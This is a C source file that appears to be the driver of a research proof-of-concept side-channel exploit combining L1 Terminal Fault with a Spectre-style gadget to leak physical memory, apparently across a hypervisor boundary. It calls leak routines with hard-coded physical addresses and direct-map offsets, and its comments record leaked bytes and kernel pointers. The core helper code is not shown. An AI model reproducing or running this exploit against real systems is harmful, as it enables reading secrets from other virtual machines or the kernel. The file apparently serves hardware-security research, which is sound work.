#include <assert.h>
#include <ctype.h>
#include <err.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>
#include "constants.h"
#include "helpers.h"
#include "hypercall.h"
#include "l1tf.h"
#include "spectre.h"
#include "util.h"

void leak_and_print(uintptr_t base, uintptr_t pa, int nr_bytes)
{
	char *data = l1tf_leak(base, pa, nr_bytes);

	for (int i = 0; i < nr_bytes; i++) {
		printf("%02x ", (uint8_t)data[i]);
	}
	printf("\n");
	for (int i = 0; i < nr_bytes; i++) {
		printf("%c", isprint(data[i]) ? data[i] : '_');
	}
	printf("\n");

	free(data);
}

int main(void)
{
	srand(time(0));
	set_cpu_affinity(CPU);
	l1tf_init();
	// void *p = l1tf_spawn_leak_page();

	// // uintptr_t pa = l1tf_find_page_pa(p);
	// uintptr_t pa = 0x403b765000;
	// printf("l1tf_find_page_pa --> %lx\n", pa);
	// l1tf_test(p, pa, 1000000);

	// uintptr_t base = l1tf_find_base();
	// uintptr_t base = 0xf8434c218;
	uintptr_t base = 0x88d43f218;
	// uintptr_t base = 0x12aff7e218;
	printf("l1tf_find_base --> %lx\n", base);
	// l1tf_test_base(base, 1000000);

	// test_half_spectre(p, pa, base);

	// #define N 64
	// for (int i = 0; i < N/8; i++)
	// 	*((uint64_t *)p + i) = 0x0123456789abcdef;
	// half_spectre_start(base, pa);
	// l1tf_do_leak(pa, N);
	// half_spectre_stop();

	// spectre_touch_base_start();
	// l1tf_do_leak(base, 0x10);
	// spectre_touch_base_stop();

	// @base: 00 5e de e6 48 93 ff ff 00 5d de e6 48 93 ff ff
	// phys_map[0] = ffff9348e6de5e00 = 0xffff9348c | 0x26de5e00
	// phys_map[1] = ffff9348e6de5d00 = 0xffff9348c | 0x26de5d00
	// base = 0x88d43f218 = 0x88 | 0x0d43f218

	// Assuming ffff9348e6de5d00 <-> 0x8a6de5d00, i.e. page_offset_base = 0xffff934040000000
	// *phys_map[0] = ffffffff84615070
	// *phys_map[1] = ffffffff84615f70

	// Continously leaking 16 bytes from physcial address 0x88d441200:
	// [sibling] starting half_spectre with idx = 3fd
	// fe 28 8e 76 82 97 c9 11 ae fd db c1 ee d7 9f 1a 
	// fe 28 8e 76 82 97 c9 11 ae fd db c1 ee d7 9f 1a


	// for (uintptr_t high = 0x88; high >= 0x80; high--) {
	// 	uintptr_t pa_target = (high << 28) | 0x26de5e00;
	// 	half_spectre_start(base, pa_target);
	// 	l1tf_do_leak(pa_target, 0x10);
	// 	half_spectre_stop();

	// 	pa_target = (high << 28) | 0x26de5d00;
	// 	half_spectre_start(base, pa_target);
	// 	l1tf_do_leak(pa_target, 0x10);
	// 	half_spectre_stop();

	// }


	uintptr_t direct_map = 0xffff934040000000;

	uintptr_t pa_target = 0xffffffff84615f70 - direct_map; // == 0x6cbf44615f70 == 108.7TB...
	half_spectre_start(base, pa_target);
	l1tf_do_leak(pa_target, 0x18);
	half_spectre_stop();


	// uintptr_t leak_pa = (base & ~63) + 128*64 + 0x10;
	// leak_pa = base;

	// half_spectre_start(base, leak_pa);
	// l1tf_do_leak(leak_pa, 0x10);
	// half_spectre_stop();

	// // uintptr_t leak_pa = (base & ~63) + 128*64;
	// leak_and_print(base, leak_pa, 4);

	return 0;
}
